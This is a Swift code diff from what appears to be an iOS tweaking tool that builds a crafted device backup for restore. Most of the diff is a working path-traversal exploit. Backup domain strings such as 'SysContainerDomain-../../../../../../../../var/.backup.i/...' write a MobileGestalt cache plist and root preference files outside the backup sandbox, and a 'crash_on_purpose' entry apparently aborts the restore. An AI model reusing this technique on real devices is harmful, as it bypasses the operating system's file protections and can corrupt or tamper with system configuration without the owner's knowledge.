@@ -65,16 +65,17 @@ struct LogView: View {
             try? FileManager.default.removeItem(at: folder)
             try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: false)
             
-            var backupFiles: [BackupFile] = [
-                Directory(path: "", domain: "RootDomain"),
-                Directory(path: "Library", domain: "RootDomain"),
-                Directory(path: "Library/Preferences", domain: "RootDomain"),
+            let backupFiles: [BackupFile] = [
+                Directory(path: "", domain: "RootDomain", owner: 501, group: 501),
+                Directory(path: "Library", domain: "RootDomain", owner: 501, group: 501),
+                Directory(path: "Library/Preferences", domain: "RootDomain", owner: 501, group: 501),
                 ConcreteFile(path: "Library/Preferences/temp", domain: "RootDomain", contents: mobileGestaltData, owner: 501, group: 501),
+                Directory(path: "", domain: "SysContainerDomain-../../../../../../../../var/.backup.i/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/", owner: 501, group: 501),
+                ConcreteFile(path: "", domain: "SysContainerDomain-../../../../../../../../var/.backup.i/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist", contents: mobileGestaltData, owner: 501, group: 501),
+                Directory(path: "", domain: "SysContainerDomain-../../../../../../../../var/.backup.i/var/root/Library/Preferences/temp", owner: 501, group: 501),
+                ConcreteFile(path: "", domain: "SysContainerDomain-../../../../../../../../crash_on_purpose", contents: Data()),
             ]
-            addExploitedConcreteFile(list: &backupFiles, path: "/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist", contents: Data(), owner: 501, group: 501)
-            // Break the hard link
-            backupFiles.append(ConcreteFile(path: "", domain: "SysContainerDomain-../../../../../../../../var/.backup.i/var/root/Library/Preferences/temp", contents: Data(), owner: 501, group: 501))
-            backupFiles.append(ConcreteFile(path: "", domain: "SysContainerDomain-../../../../../../../../crash_on_purpose", contents: Data()))
+            
             let mbdb = Backup(files: backupFiles)
             try mbdb.writeTo(directory: folder)
             
@@ -96,11 +97,5 @@ struct LogView: View {
             print(error.localizedDescription)
             return
         }
-    }
-    
-    func addExploitedConcreteFile(list: inout [BackupFile], path: String, contents: Data, owner: Int32 = 0, group: Int32 = 0) {
-        let url = URL(filePath: path)
-        list.append(Directory(path: "", domain: "SysContainerDomain-../../../../../../../../var/.backup.i\(url.deletingLastPathComponent().path(percentEncoded: false))", owner: owner, group: group))
-        list.append(ConcreteFile(path: "", domain: "SysContainerDomain-../../../../../../../../var/.backup.i\(url.path(percentEncoded: false))", contents: contents, owner: owner, group: group))
     }
 }
